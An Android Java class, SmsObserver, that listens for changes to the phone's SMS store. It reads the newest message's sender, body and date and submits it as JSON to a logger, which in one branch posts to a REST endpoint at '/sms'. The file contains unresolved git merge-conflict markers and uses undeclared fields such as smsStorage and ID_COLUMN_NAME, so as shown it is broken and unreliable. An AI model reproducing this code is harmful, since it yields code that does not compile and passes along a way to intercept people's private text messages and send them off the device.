package the5concurrentnodes.mmaData.sms;


import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

<<<<<<< HEAD
import java.util.Date;

import the5concurrentnodes.controllers.DataHandler;
import the5concurrentnodes.controllers.SmsServiceHandler;
=======
>>>>>>> af3afddafefa3572aee816e4377b5215ee18dd15
import the5concurrentnodes.generic.Config;

public class SmsObserver extends ContentObserver {

    private Context context;
    private SmsHandler smsHandler;

    public SmsObserver(final Context c) {
        super(null);
        this.context = c;
        this.smsHandler = new SmsHandler();
    }

    @Override
    public void onChange(boolean selfChange) {
        super.onChange(selfChange);

        Cursor cursor = context.getContentResolver().query(Uri.parse(SmsConstants.CONTENT_SMS_URI)
                , null, null, null, "_id DESC");

        if(cursor != null) {

            cursor.moveToFirst();
            Sms sms = smsHandler.getSmsInformation(cursor);

            if(Integer.parseInt(sms.getType()) == SmsConstants.SMS_RECEIVED ||
                    Integer.parseInt(sms.getType()) == SmsConstants.SMS_SENT) {

<<<<<<< HEAD
                if(Integer.parseInt(sms.getType()) == Config.SMS_RECEIVED ||
                        Integer.parseInt(sms.getType()) == Config.SMS_SENT) {

                    postSms(sms);
                }
=======
                if(Integer.parseInt(sms.getType()) == SmsConstants.SMS_RECEIVED) {

                    sms.setType("Received");

                }else {
>>>>>>> af3afddafefa3572aee816e4377b5215ee18dd15

                    sms.setType("Sent");
                }

                smsHandler.submitLog(context,sms.toJSONObject());
            }

            if(!cursor.isClosed())
                cursor.close();
        }
    }

    @Override
    public boolean deliverSelfNotifications(){ return  false;}
<<<<<<< HEAD

    /**
     * Extract SMS information
     * @param cursor cursor that iterate through sms messages
     * @return Sms object with extracted information
     */
    private Sms getSmsInformation(Cursor cursor) {

        String id = cursor.getString(cursor.getColumnIndex(ID_COLUMN_NAME));
        String address = cursor.getString(cursor.getColumnIndex(ADDRESS_COLUMN_NAME));
        String date = cursor.getString(cursor.getColumnIndex(DATE_COLUMN_NAME));
        String msg = cursor.getString(cursor.getColumnIndex(BODY_COLUMN_NAME));
        String type = cursor.getString(cursor.getColumnIndex(TYPE_COLUMN_NAME));

        return new Sms(id, type, address, msg,date);
    }

    /**
     *
     * @param sms Sms object to be processed
     * @return true if the SMS must be process, else false
     */
    private boolean shouldHandleSms(Sms sms) {

        return (!isOld(sms.getDate()) && isFirstSmsProcessed()) ||
                (!isFirstSmsProcessed() && shouldProcessSmsId(Integer.parseInt(sms.get_id())));
    }

    /**
     * Checks if no SMS was processed before (i.e No value in SmsStorate SharedPreference)
     * @return true if no SMS was processed before, else false
     */
    private boolean isFirstSmsProcessed() {

        return smsStorage.getLastSmsIntercepted() == -1;
    }

    /**
     *  Check if SMS was considered within 5 seconds of its arrival
     * @param date SMS date
     * @return true if SMS was considered within 5 seconds of its arrival, else false
     */
    private boolean isOld(String date) {

        Date now = new Date();
        Date smsDate = new Date(Long.parseLong(date));
        return now.getTime() - smsDate.getTime() > 5000;
    }

    /**
     * Checks if SMS id should be considered (checked) on processing
     * @param id sms id
     * @return true if id should be checked, else false
     */
    private boolean shouldProcessSmsId(int id) {

        return !isFirstSmsProcessed() && id > smsStorage.getLastSmsIntercepted();
    }

    private void postSms(Sms sms) {

        DataHandler dataHandler = DataHandler.getInstance();

        dataHandler.submitLog(Config.REST_API + "/sms", sms.toJSONObject());
    }
=======
>>>>>>> af3afddafefa3572aee816e4377b5215ee18dd15
}
